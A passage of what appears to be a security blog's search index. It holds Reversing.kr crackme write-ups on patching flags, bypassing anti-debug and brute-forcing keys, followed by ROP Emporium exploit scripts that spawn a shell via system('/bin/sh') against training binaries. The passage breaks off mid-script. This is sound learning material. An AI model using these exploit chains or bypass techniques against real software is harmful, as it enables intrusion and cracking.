12); *(\u0026amp;v21 + j + 1) ^= (byte[j - 4] - 12); v23[j - 2] ^= (byte[j - 3] - 12); v23[j - 1] ^= (byte[j - 2] - 12); } while ( j \u0026lt; 25 ); if ( v2 ) { v8 = 0; v9 = v23; do { v10 = *v9++; v11 = v8++ + (v10 ^ 0xF); *(v9 - 1) = v11; } while ( v8 \u0026lt; 25 ); v24 = 0; wprintf(L\u0026#34;%s\\n\u0026#34;, v23); } wprintf(L\u0026#34;\\n\u0026#34;, v5); return 1i64; } The program asks me to enter 6 numbers:\n1 wscanf_s(L\u0026#34;%d %d %d %d %d %d\u0026#34;, \u0026amp;n1, \u0026amp;n2, \u0026amp;n3, \u0026amp;n4, \u0026amp;n5, \u0026amp;n6); And then these 6 numbers will be compared with 6 randomly generated numbers:\n1 2 for ( i = 0i64; i \u0026lt; 6; v19[i - 1] = rand() % 100 ) ++i; Initialize the value and decrypt my password\n1 2 3 4 5 6 7 8 9 10 do { v7 = byte[j - 1]; j += 5i64; *(\u0026amp;v20 + j + 1) ^= (v7 - 12); *(\u0026amp;v21 + j) ^= (byte[j - 5] - 12); *(\u0026amp;v21 + j + 1) ^= (byte[j - 4] - 12); v23[j - 2] ^= (byte[j - 3] - 12); v23[j - 1] ^= (byte[j - 2] - 12); } Set breakpoint here to analyse the loop.\nSelect Local windows debuggerand start debugging\nAfter entering 6 random numbers, return to the debug screen:\nHere the program checks if all 6 numbers are correct, it uses the command jnz, if not 0 (ZF = 0) then it will jump to the input:\nChange ZeroFlag to 1:\nAfter decrypting there is still one more condition:\nSet a breakpoint and do the same here:\nThis time the program uses the command jz(jump if zero, ZF = 1), just need to change it in reverse compared to the command above:\nHere the program will print something that looks like a password\nPassword: from_GHL2_-_!\nAutoHotKey1 - 130pts File packed with UPX:\nMình thử dùng UPX 3.96 để unpack file này ra nhưng sau khi chạy thì nó hiện thông báo lỗi:\nI tried searching in the string Exe corrupted and xref and there are 2 functions that use it:\nBased on the known offset, I used x32dbg to debug this file and traced it to this part:\nje will jump past this test, so I set a breakpoint there and adjust ZeroFlag = 1:\nAfter passing, when running for a while, you will see the MD5 DecryptKey appear:\n220226394582d7117410e3c021748c2a\nDecrypt MD5 with online tool ( https://md5decrypt.net/).\nFind the rest\nTry setting a breakpoint, step into is the same:\nHere is the comparison pwd hash, imilar, decrypt md5:\n54593f6b9413fc4ff2b4dec2da337806\nResult\nPassword: isolated pawn\nCSHARP - 160pts Because it\u0026rsquo;s Csharp, I use dnSpy64\nAfter the file receives its input, it will convert it to base64 bytes, and then run through this Invoke function to check:\nSet a breakpoint at the function call and debug:\nPress F11 to step into the function:\nContinue F11:\nOnly focus on the return of the function:\nStep into:\nIn RuntimeMethodHandle there is something running with it, but i couldn\u0026rsquo;t do static analysis before:\nStep into:\nCopy to python and edit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from base64 import b64decode flag = [0]*12 flag[0] = 16 ^ 74 flag[3] = 51 ^ 70 flag[1] = 17 ^ 87 flag[2] = 33 ^ 77 flag[11] = 17 ^ 44 flag[8] = 144 ^ 241 flag[4] = 68 ^ 29 flag[5] = 102 ^ 49 flag[9] = 181 ^ 226 flag[7] = 160 ^ 238 flag[10] = 238 ^ 163 flag[6] = 51 ^ 117 print(b64decode(\u0026#34;\u0026#34;.join([chr(i) for i in flag])).decode()) #dYnaaMic Password: dYnaaMic\nTwist1 - 190pts From source and write up and explain by others, I was able to do this chal.\nNormal input chal, let analyse with IDA:\nVery few functions and no OEP found so I think this is a packed file somehow\nWhen running it shows an error like this:\nThe program stops at the command pop ss:\nReference pop ss:\npop ss will execute the next command and block the current command until the next command is executed.\nIn addition, when I debug, I see a loop section where loc_407063, when running this section, the code sections appear one after another below, this will be the decryot section, so I set a breakpoint there 0040706F to get the entire complete code.\nThere are a lot of common anti-debug techniques.\nSwitching to x32dbg, after the code was decrypted, I noticed something mov eax,dword ptr fs:[30] strange:\nThis is a antidebug technique, found on stackoverflow.\nThis means that eax is set to point to a point in the PEB structure in the process.\neax value now.\nAddr of PEB is 0x332000:\nedx is 0, since ecx got xor each other,then store with value 0x28, the result then xor with 0x30 (result = 0x18) and then added directly to eax or the address of PEB. In other words, It pointed to addrss of PEB + 0x18.\nThe PEB architecture is configured slightly differently in different x32 and x64 versions. In this case, we are looking at a 32bit, trong trường hợp này, edx will point to ProcessHeap (PEB + 0x18).\nInside twist1.40709F, ProcessHeap is added by 0xC and compare with 2:\n+0x000 Entry : _HEAP_ENTRY +0x008 Signature : Uint4B +0x00c Flags : Uint4B +0x010 ForceFlags : Uint4B +0x014 VirtualMemoryThreshold : Uint4B +0x018 SegmentReverse : Uint4B +0x01c SegmentCommit : Uint4B +0x020 DecommitFreeBlockThreshold : Uint4B Smae at 004070D5 will also be a ProcessHeap + 0x10 to access ForceFlags and verify.\nTo bypass , you need to set the ecx register to have a value equal to ebx:\nNext\nThis time, the ptr ePPEBdx- 0x10 return to PEB, then the program uses + 0xC, it will point to _PEB_LDR_DATA. _EB_LDR_DATA + 0x10 to use InInitializationOrderLinks(based on LDR_DATA_TABLE_ENTRY to search).\nLdr performs a check to see if it is debugging by repeatedly comparing it to 0xEEFEEEFE or 0xABABABAB to see if the debugger has filled the unused part of the heap with 0xABABABAB or 0xEEFEEEFE, specifically it compares 0x1F4 times:\nAt 407183 there is still a loop, set a breakpoint at nop to exit the loop\nThen the program jump to 40157C which is likely the entrypoint, by then the program is completely unpacked:\nWhen run ,at 40129B it got this error like this:\nTry jump to the next address 40129D:\nInput field:\ntwis1.401240 is check function.\nGo inside, we can see our input store\nInput is at:\nHere we will find al = 0x77^0x35 = “B”; (3rd character)\nDebug\nTrap, bypass:\nDo the same with the remaining characters and you will get the corresponding string.\nInput: RIBENA.\nPEpassword - 150pts Original.exe: The Original file will be the file before packing, basically it xor 2 arrays together, and this is when I set a breakpoint to see its value before printing:\nPunch of ?\nPacked.exe: Because it is a packed file, at first the file requires a password. I guess it will use this password to decrypt the file into the original file.\nAfter debugging, I found the place where the file gets my input:\nMình đã đổi tên cho dễ hiểu, tạm thời mình bỏ qua đoạn nhập pass word và đi thẳng đến đoạn nó lấy password xử lí bằng cách pass qua các lệnh jz bằng cách mod giá trị ZF và trace tới hàm process:\nBypassing it through jz by modifying the value ZF then trace\nInput store in ebx and eax before processing, after processing the return is eax while ebx is const.\nReturn eax use for decoding 0x401004 and the value is 0x5a5a7e05\nAnd for one reason, after xor eax with .text in packed, that segment will become the original segment, so I use HxD to trace\nOriginal.exe:\nPacked.exe:\neax = Packed(0x014cec81) ^ Original(0xb6e62e17) = 0xb7aac296\nWe have eax, ebx is const so we can brutefroce to find ebx:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;iostream\u0026gt; using namespace std; unsigned int rol(unsigned int x, int count) { unsigned int num1 = (x \u0026lt;\u0026lt; count) \u0026amp; 4294967295; unsigned int num2 = x \u0026gt;\u0026gt; (32 - count); return num1 | num2; } unsigned int ror(unsigned int x, int count) { return rol(x, 32 - count); } //funtion : internet int main() { for (unsigned int i = 0; i \u0026lt; 0xffffffff; i++) { unsigned int ebx = i; unsigned int eax = 0xb7aac296; unsigned int al = eax \u0026amp; 0xff; ebx = rol(ebx, al % 32); eax = eax ^ ebx; unsigned int bh = (ebx \u0026amp; 0xffff) \u0026gt;\u0026gt; 8; eax = ror(eax, bh % 32); if (eax == 0x5a5a7e05) printf(\u0026#34;ebx : 0x%08x\\n\u0026#34;, i); } return 0; } ebx : 0xa1beee22 ebx : 0xc263a2cb There are 2 reasonable values, try eax and ebx at 0040921F:\nFinished.\nPassword: From_GHL2_!!\nWindowKernel - 220pts Exploit\nINT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4) { if ( a2 == 272 ) { SetDlgItemTextW(hWnd, 1001, L\u0026#34;Wait.. \u0026#34;); SetTimer(hWnd, 0x464u, 0x3E8u, 0); return 1; } if ( a2 != 273 ) { if ( a2 == 275 ) { KillTimer(hWnd, 0x464u); sub_401310(); return 1; } return 0; } if ( (unsigned __int16)a3 == 2 ) { SetDlgItemTextW(hWnd, 1001, L\u0026#34;Wait.. \u0026#34;); sub_401490(); EndDialog(hWnd, 2); return 1; } if ( (unsigned __int16)a3 == 1002 ) { if ( HIWORD(a3) == 1024 ) { Sleep(0x1F4u); return 1; } return 1; } if ( (unsigned __int16)a3 != 1003 ) return 0; sub_401110(hWnd); return 1; } In sub_401110(hWnd); there is a string Correct!\nHWND __thiscall sub_401110(HWND hDlg) { HWND result; // eax HWND v3; // eax HWND v4; // eax HWND DlgItem; // eax WCHAR String[256]; // [esp+8h] [ebp-204h] BYREF GetDlgItemTextW(hDlg, 1003, String, 512); if ( lstrcmpW(String, L\u0026#34;Enable\u0026#34;) ) { result = (HWND)lstrcmpW(String, L\u0026#34;Check\u0026#34;); if ( !result ) { if ( sub_401280(0x2000) == 1 ) MessageBoxW(hDlg, L\u0026#34;Correct!\u0026#34;, L\u0026#34;Reversing.Kr\u0026#34;, 0x40u); else MessageBoxW(hDlg, L\u0026#34;Wrong\u0026#34;, L\u0026#34;Reversing.Kr\u0026#34;, 0x10u); SetDlgItemTextW(hDlg, 1002, \u0026amp;word_4021F0); DlgItem = GetDlgItem(hDlg, 1002); EnableWindow(DlgItem, 0); return (HWND)SetDlgItemTextW(hDlg, 1003, L\u0026#34;Enable\u0026#34;); } } else if ( sub_401280(4096) ) { v3 = GetDlgItem(hDlg, 1002); EnableWindow(v3, 1); SetDlgItemTextW(hDlg, 1003, L\u0026#34;Check\u0026#34;); SetDlgItemTextW(hDlg, 1002, \u0026amp;word_4021F0); v4 = GetDlgItem(hDlg, 1002); return SetFocus(v4); } else { return (HWND)MessageBoxW(hDlg, L\u0026#34;Device Error\u0026#34;, L\u0026#34;Reversing.Kr\u0026#34;, 0x10u); } return result; } Focus on sub_401280(0x2000) == 1, if condition true it will return \u0026ldquo;Correct!\u0026rdquo;:\nint __usercall sub_401280@\u0026lt;eax\u0026gt;(HWND a1@\u0026lt;edi\u0026gt;, DWORD dwIoControlCode) { HANDLE FileW; // esi DWORD BytesReturned; // [esp+4h] [ebp-8h] BYREF int OutBuffer; // [esp+8h] [ebp-4h] BYREF FileW = CreateFileW(L\u0026#34;\\\\\\\\.\\\\RevKr\u0026#34;, 0xC0000000, 0, 0, 3u, 0, 0); if ( FileW == (HANDLE)-1 ) { MessageBoxW(a1, L\u0026#34;[Error] CreateFile\u0026#34;, L\u0026#34;Reversing.Kr\u0026#34;, 0x10u); return 0; } else if ( DeviceIoControl(FileW, dwIoControlCode, 0, 0, \u0026amp;OutBuffer, 4u, \u0026amp;BytesReturned, 0) ) { CloseHandle(FileW); return OutBuffer; } else { MessageBoxW(a1, L\u0026#34;[Error] DeviceIoControl\u0026#34;, L\u0026#34;Reversing.Kr\u0026#34;, 0x10u); return 0; } } Here is the part where it creates the file and returns 1, I pay attention to this part:\n1 DeviceIoControl(FileW, dwIoControlCode, 0, 0, \u0026amp;OutBuffer, 4u, \u0026amp;BytesReturned, 0) Basically it stands for Device In Out Control, go back and check the file WinKer.sys:\nNTSTATUS __stdcall DriverEntry(_DRIVER_OBJECT *DriverObject, PUNICODE_STRING RegistryPath) { int v3; // edi PDEVICE_OBJECT v4; // ecx char *v5; // et1 char *v6; // et1 char *v7; // et1 char v8; // al struct _KDPC *v9; // esi char *v10; // et1 struct _UNICODE_STRING DestinationString; // [esp+Ch] [ebp-134h] BYREF union _LARGE_INTEGER Interval; // [esp+14h] [ebp-12Ch] BYREF PDEVICE_OBJECT DeviceObject; // [esp+1Ch] [ebp-124h] BYREF PVOID P; // [esp+20h] [ebp-120h] CCHAR Number[4]; // [esp+24h] [ebp-11Ch] struct _OSVERSIONINFOW VersionInformation; // [esp+28h] [ebp-118h] BYREF DbgSetDebugFilterState(0x65u, 3u, 1u); DbgPrint(\u0026#34;Driver Load!! \\n\u0026#34;); DriverObject-\u0026gt;DriverUnload = (PDRIVER_UNLOAD)sub_1131C; dword_13030 = 0; VersionInformation.dwOSVersionInfoSize = 276; if ( RtlGetVersion(\u0026amp;VersionInformation) ) { MajorVersion = VersionInformation.dwMajorVersion; MinorVersion = VersionInformation.dwMinorVersion; } else { PsGetVersion(\u0026amp;MajorVersion, \u0026amp;MinorVersion, 0, 0); } RtlInitUnicodeString(\u0026amp;DestinationString, \u0026#34;\\\\\u0026#34;); P = (PVOID)IoCreateDevice(DriverObject, 4u, \u0026amp;DestinationString, 0x22u, 0, 0, \u0026amp;DeviceObject); if ( (int)P \u0026gt;= 0 ) { RtlInitUnicodeString(\u0026amp;SymbolicLinkName, L\u0026#34;\\\\DosDevices\\\\RevKr\u0026#34;); v3 = IoCreateSymbolicLink(\u0026amp;SymbolicLinkName, \u0026amp;DestinationString); if ( v3 \u0026gt;= 0 ) { v4 = DeviceObject; DriverObject-\u0026gt;MajorFunction[14] = (PDRIVER_DISPATCH)sub_11288; DriverObject-\u0026gt;MajorFunction[0] = (PDRIVER_DISPATCH)sub_112F8; DriverObject-\u0026gt;MajorFunction[2] = (PDRIVER_DISPATCH)sub_112F8; *(_DWORD *)v4-\u0026gt;DeviceExtension = 0; SystemArgument2 = DeviceObject-\u0026gt;DeviceExtension; *(_DWORD *)SystemArgument2 = DeviceObject; v5 = *(char **)\u0026amp;KeNumberProcessors; ::P = ExAllocatePool(NonPagedPool, 4 * *v5); KeInitializeDpc(\u0026amp;DeviceObject-\u0026gt;Dpc, sub_11266, DeviceObject); v6 = *(char **)\u0026amp;KeNumberProcessors; P = ExAllocatePool(NonPagedPool, 32 * *v6); if ( P ) { v7 = *(char **)\u0026amp;KeNumberProcessors; Interval.QuadPart = -10000000i64; v8 = *v7; Number[0] = 0; if ( v8 \u0026gt; 0 ) { do { v9 = (struct _KDPC *)((char *)P + 32 * Number[0]); KeInitializeDpc(v9, sub_113E8, 0); KeSetTargetProcessorDpc(v9, Number[0]); KeInsertQueueDpc(v9, 0, 0); KeDelayExecutionThread(0, 0, \u0026amp;Interval); v10 = *(char **)\u0026amp;KeNumberProcessors; ++Number[0]; } while ( Number[0] \u0026lt; *v10 ); } ExFreePoolWithTag(P, 0); } return 0; } else { IoDeleteDevice(DriverObject-\u0026gt;DeviceObject); return v3; } } else { DbgPrint(\u0026#34;IoCreateDevice Error\\n\u0026#34;); return (NTSTATUS)P; } } At DbgPrint(\u0026quot;IoCreateDevice Error\\n\u0026quot;); file create IoCreateDevice then check and send to file WindowKernel.\nint __stdcall sub_111DC(char a1) { int result; // eax bool v2; // zf result = 1; if ( dword_1300C != 1 ) { switch ( dword_13034 ) { case 0: case 2: case 4: case 6: goto LABEL_3; case 1: v2 = a1 == -91; goto LABEL_6; case 3: v2 = a1 == -110; goto LABEL_6; case 5: v2 = a1 == -107; LABEL_6: if ( !v2 ) goto LABEL_7; LABEL_3: ++dword_13034; break; case 7: if ( a1 == -80 ) dword_13034 = 100; else LABEL_7: dword_1300C = 1; break; default: result = sub_11156(a1); break; } } return result; } int __stdcall sub_11156(char a1) { int result; // eax bool v2; // zf char v3; // [esp+8h] [ebp+8h] v3 = a1 ^ 0x12; result = dword_13034 - 100; switch ( dword_13034 ) { case \u0026#39;d\u0026#39;: case \u0026#39;f\u0026#39;: case \u0026#39;h\u0026#39;: case \u0026#39;j\u0026#39;: goto LABEL_2; case \u0026#39;e\u0026#39;: v2 = v3 == -78; goto LABEL_4; case \u0026#39;g\u0026#39;: v2 = v3 == -123; goto LABEL_4; case \u0026#39;i\u0026#39;: v2 = v3 == -93; LABEL_4: if ( !v2 ) goto LABEL_5; LABEL_2: ++dword_13034; break; case \u0026#39;k\u0026#39;: if ( v3 == -122 ) dword_13034 = 200; else LABEL_5: dword_1300C = 1; break; default: result = sub_110D0(v3); break; } return result; } int __stdcall sub_110D0(char a1) { int result; // eax char v2; // cl bool v3; // zf result = dword_13034 - 200; v2 = a1 ^ 5; switch ( dword_13034 ) { case 200: case 202: case 204: case 206: goto LABEL_2; case 201: v3 = v2 == -76; goto LABEL_4; case 203: case 205: v3 = v2 == -113; LABEL_4: if ( v3 ) goto LABEL_2; goto LABEL_10; case 207: if ( v2 != -78 ) goto LABEL_10; dword_13024 = 1; LABEL_2: ++dword_13034; break; case 208: dword_13024 = 0; LABEL_10: dword_1300C = 1; break; default: return result; } return result; } All three of these functions share the same variable count dword_13024 and loop through begin to end.\nBack to the first function, the count variable starts from 0 =\u0026gt; the first check function, next set count = 100 and goes to the second function count-100 and uses it =\u0026gt; consider the input is divided into 3 segments and checked by 3 functions.\nvoid __stdcall sub_11266(_KDPC *Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2) { char v4; // al v4 = READ_PORT_UCHAR((PUCHAR)0x60); first(v4); } It receives signal from API READ_PORT_UCHAR , if you look it up on the internet it will receive char from port 60 and return scancodes.\nscancodes-keys map table here.\nFirst 4 characters.\nint __stdcall first(char a1) { int result; // eax bool v2; // zf result = 1; if ( dword_1300C != 1 ) { switch ( count ) { case 0: case 2: case 4: case 6: goto LABEL_3; case 1: v2 = a1 == (char)0xA5; // K realeased (phím K) goto LABEL_6; case 3: v2 = a1 == (char)0x92; // E realeased goto LABEL_6; case 5: v2 = a1 == (char)0x95; // Y realeased LABEL_6: if ( !v2 ) goto LABEL_7; LABEL_3: ++count; break; case 7: if ( a1 == (char)0xB0 ) // B realeased count = 100; else LABEL_7: dword_1300C = 1; break; default: result = second(a1); break; } } return result; } Similar\nint __stdcall second(char a1) { int result; // eax bool v2; // zf char v3; // [esp+8h] [ebp+8h] v3 = a1 ^ 0x12; result = count - 100; switch ( count ) { case \u0026#39;d\u0026#39;: case \u0026#39;f\u0026#39;: case \u0026#39;h\u0026#39;: case \u0026#39;j\u0026#39;: goto LABEL_2; case \u0026#39;e\u0026#39;: v2 = v3 == (char)0xB2; // 0x12^0xB2 = 0xA0 =\u0026gt; D realeased goto LABEL_4; case \u0026#39;g\u0026#39;: v2 = v3 == (char)0x85; // 0x12^0x85 = 0x97 =\u0026gt; I realeased goto LABEL_4; case \u0026#39;i\u0026#39;: v2 = v3 == (char)0xA3; // 0x12^0xA3 = 0xB1 =\u0026gt; N realeased LABEL_4: if ( !v2 ) goto LABEL_5; LABEL_2: ++count; break; case \u0026#39;k\u0026#39;: if ( v3 == (char)0x86 ) // 0x12^0x86 = 0x94 =\u0026gt; T realeased count = 200; else LABEL_5: dword_1300C = 1; break; default: result = last(v3); break; } return result; } int __stdcall last(char a1) { int result; // eax char v2; // cl bool v3; // zf result = count - 200; v2 = a1 ^ 5; switch ( count ) { case 200: case 202: case 204: case 206: goto LABEL_2; case 201: v3 = v2 == (char)0xB4; // 0xB4^0x12^5 = 0xA3 =\u0026gt; T goto LABEL_4; case 203: // 0x8F^0x12^5 = 0x98 =\u0026gt; O realeased case 205: // 0x8F^0x12^5 = 0x98 =\u0026gt; O realeased v3 = v2 == (char)0x8F; LABEL_4: if ( v3 ) goto LABEL_2; goto LABEL_10; case 207: if ( v2 != (char)0xB2 ) // 0xB2^0x12^5 = 0xA5 =\u0026gt; K realeased goto LABEL_10; dword_13024 = 1; LABEL_2: ++count; break; case 208: dword_13024 = 0; LABEL_10: dword_1300C = 1; break; default: return result; } return result; } Following the instructions in the readme.txt file, key:keybdinthook\n","description":"","id":19,"section":"posts","tags":["practice","reverseing","writeups"],"title":"Reversing.kr Training Writeups","uri":"https://duythucne22.github.io/posts/reversing.kr/"},{"content":"Bof Fmt Heap ","description":"My Note","id":20,"section":"notes","tags":["pwn","bof","heap","rop"],"title":"Pwn simple exploit","uri":"https://duythucne22.github.io/notes/note/"},{"content":"Writeup — ROP Emporium Challenge 01: ret2win Our aim is overflow to control RIP.\nThe input buffer is 32 bytes, but the input area allows 56 bytes. This allow overwriting the saved RBP and RIP.\nExploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * p = process(\u0026#34;./ret2win\u0026#34;) elf = ELF(\u0026#34;./ret2win\u0026#34;) payload = \u0026#34;A\u0026#34; * 40 payload += p64(elf.symbols[\u0026#34;ret2win\u0026#34;]) open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.sendline(payload) p.interactive() Challenge 02: split RCE then print flag\nLocate the string \u0026ldquo;/bin/cat flag.txt\u0026rdquo; and use pop edi; ret; to set the argument, followed by a call to system.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * p = process(\u0026#34;./split\u0026#34;) payload = \u0026#34;A\u0026#34; * 40 pop_rdi = 0x00400883 bin_string = 0x00601060 call_system = 0x00400810 payload += p64(pop_rdi) payload += p64(bin_string) payload += p64(call_system) open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.clean() p.sendline(payload) p.interactive() Challenge 03: callme Call three functions (callme_one, callme_two, callme_three) with required arguments.\nUse pop rdi; pop rsi; pop rdx; ret; to set the required arguments for each function.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * p = process(\u0026#34;./callme\u0026#34;) payload = \u0026#34;A\u0026#34; * 40 callme_one_plt = p64(0x00401850) callme_two_plt = p64(0x00401870) callme_three_plt = p64(0x00401810) # pop rdi # pop rsi # pop rdx pop_args = p64(0x00401ab0) one = p64(1) two = p64(2) three = p64(3) payload += pop_args payload += one payload += two payload += three payload += callme_one_plt payload += pop_args payload += one payload += two payload += three payload += callme_two_plt payload += pop_args payload += one payload += two payload += three payload += callme_three_plt open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.clean() p.sendline(payload) p.interactive() Challenge 04: write4 Write flag.txt to a writable memory section, then call print_file().\nUse mov [reg], reg; ret; to write the string and pop rdi; ret; to set the argument for print_file.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 from pwn import * import angr, angrop p = process(\u0026#34;./write4\u0026#34;) # p = angr.Project(\u0026#34;write4\u0026#34;) # rop = p.analyses.ROP() # rop.find_gadgets() system_call = p64(0x00400810) payload = \u0026#34;A\u0026#34; * 40 payload += p64(0x400890) # pop r14; pop r15; ret payload += p64(0x00601050) # address in data payload += (\u0026#34;/bin/sh\\0\u0026#34;) payload += p64(0x400820) # mov qword ptr [r14], r15; ret payload += p64(0x400893) # pop rdi; ret payload += p64(0x00601050) # our address in data payload += system_call open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.clean() p.sendline(payload) p.interactive() Challenge 05: badchars Bypass bad character checks.\nXOR the string to bypass the checks, write it to a writable section, and XOR it back before calling print_file.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * # import angr, angrop # badchars are: b i c / \u0026lt;space\u0026gt; f n s p = process(\u0026#34;./badchars\u0026#34;) # p = angr.Project(\u0026#34;badchars\u0026#34;) # rop = p.analyses.ROP() # rop.find_gadgets() xor = p64(0x00400b30) # xor byte [r15], r14b; ret mov = p64(0x00400b34) # mov qword [r13], r12; ret pop_rdi = p64(0x00400b39) # pop rdi; ret pop_r12_r13 = p64(0x00400b3b) # pop r12; pop r13; ret pop_r14_r15 = p64(0x00400b40) # pop r14; pop r15; ret pop_r15 = p64(0x00400b42) # pop r15; ret data_addr = [p64(a) for a in range(0x00601074, 0x0060107c)] system_call = p64(0x004006f0) payload = \u0026#34;A\u0026#34; * 40 payload += pop_r12_r13 payload += p64(0x0068732f6e69622f ^ 0xa6a6a6a6a6a6a6a6) # /bin/sh in hex xor\u0026#39;d 0xa6 payload += data_addr[0] payload += mov payload += pop_r14_r15 payload += p64(0xa6a6a6a6a6a6a6a6) payload += data_addr[0] for i in range(1, 8): payload += xor payload += pop_r15 payload += data_addr[i] payload += xor payload += pop_rdi payload += data_addr[0] payload += system_call open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.clean() p.sendline(payload) p.interactive() Challenge 06: fluff Write flag.txt using advanced gadgets.\nUse gadgets like stosb, xlat, and bextr to manipulate registers and write flag.txt byte by byte.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 from pwn import * # import angr, angrop p = process(\u0026#34;./fluff\u0026#34;) # p = angr.Project(\u0026#34;fluff\u0026#34;) # rop = p.analyses.ROP() # rop.find_gadgets() data_addr = p64(0x00601050) system_call = p64(0x00400810) pop_rdi = p64(0x004008c3) # 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; xor_r11_r11_pop_r14 = p64(0x00400822) # clears r11 # 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; xchg_r11_r10_pop_r15_mov_r11 = p64(0x00400840) # 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; xor_r11_r12_pop_r12_mov_r13 = p64(0x0040082f) # 0x004008bc 415c pop r12 # 0x004008be 415d pop r13 # 0x004008c0 415e pop r14 # 0x004008c2 415f pop r15 # 0x004008c4 c3 ret pop_r12_r13_r14_r15 = p64(0x004008bc) # 0x0040084e 4d891a mov qword [r10], r11 # 0x00400851 415d pop r13 # 0x00400853 415c pop r12 # 0x00400855 453022 xor byte [r10], r12b # 0x00400858 c3 ret mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 = p64(0x0040084e) # 0x0040084f 891a mov dword [rdx], ebx # 0x00400851 415d pop r13 # 0x00400853 415c pop r12 # 0x00400855 453022 xor byte [r10], r12b # 0x00400858 c3 ret mov_pop_xor1 = p64(0x0040084f) payload = \u0026#34;A\u0026#34; * 40 payload += xor_r11_r11_pop_r14; # clear r11 payload += p64(0x11) # junk for the r14 pop payload += pop_r12_r13_r14_r15 payload += data_addr # pop into r12 in order to get xor\u0026#39;d into r11 payload += p64(0x11) # junk for the r13 pop payload += p64(0x11) # junk for the r14 pop payload += p64(0x11) # junk for the r15 pop payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our data addr) into r11 payload += p64(0x11) # junk for the r12 pop payload += xchg_r11_r10_pop_r15_mov_r11 # exchange our data addr from r11 into r10 payload += p64(0x11) # junk for the r15 pop payload += xor_r11_r11_pop_r14; # clear r11 payload += p64(0x11) # junk for the r14 pop payload += pop_r12_r13_r14_r15 # pop our string into r12 in order to get xor\u0026#39;d into r11 payload += (chr(0x2f ^ 0x11) + \u0026#34;bin/sh\\0\u0026#34;) payload += p64(0x11) # junk for the r13 pop payload += p64(0x11) # junk for the r14 pop payload += p64(0x11) # junk for the r15 pop payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our string) into r11 payload += p64(0x11) # the byte we\u0026#39;ll want to xor against the first byte of our string payload += mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 # mov our string from r11 into area of memory pointed to by r10 payload += p64(0x11) # junk for the r13 pop payload += p64(0x11) # junk for the r12 pop # Put our data address into rdi and jump to system call payload += pop_rdi payload += data_addr payload += system_call open(\u0026#39;payload\u0026#39;, \u0026#39;w\u0026#39;).write(payload) print p.recvuntil(\u0026#34;\u0026gt;\u0026#34;) p.clean() p.sendline(payload) p.interactive() Challenge 07: pivot Store the ROP chain in a pivoted stack area.\nUse xchg rsp, rax; ret; to pivot the stack to a larger buffer, then execute the ROP chain.\nExploit Code: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 from pwn import * import re # import angr, angrop p = process(\u0026#34;./pivot\u0026#34;) # p = angr.Project(\u0026#34;pivot\u0026#34;) # rop = p.analyses.ROP() # rop.find_gadgets() pop_rax = p64(0x00400b00) # pop rax; ret pop_rdi = p64(0x00400b73) # pop rdi; ret xchg_rax_rsp = p64(0x00400b02) # xchg rax, rsp; ret mov_rax_rax = p64(0x00400b05) # mov rax, qword [rax]; ret add_rax_rbp = p64(0x00400b09) # add rax, rbp; ret foothold_function = p64(0x00400850) # Can\u0026#39;t use directly because 0a triggers newline main = p64(0x00400996) printf = p64(0x00400810) puts = p64(0x00400800) foothold_got = p64(0x602048) message1 = p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) print message1 r = r\u0026#39;pivot: (.*)$\u0026#39; heap_addr = p64(int(re.search(r, message1, re.MULTILINE).group(1), 16)) print \u0026#34;Found heap_addr: \u0026#34;, heap_addr payload1 = foothold_function payload1 += pop_rdi payload1 += foothold_got payload1 += puts payload1 += main payload1 += \u0026#34;B\u0026#34;*8 print \u0026#34;Sending payload1: \u0026#34;, payload1.encode(\u0026#34;hex\u0026#34;) p.sendline(payload1) print p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) payload2 = 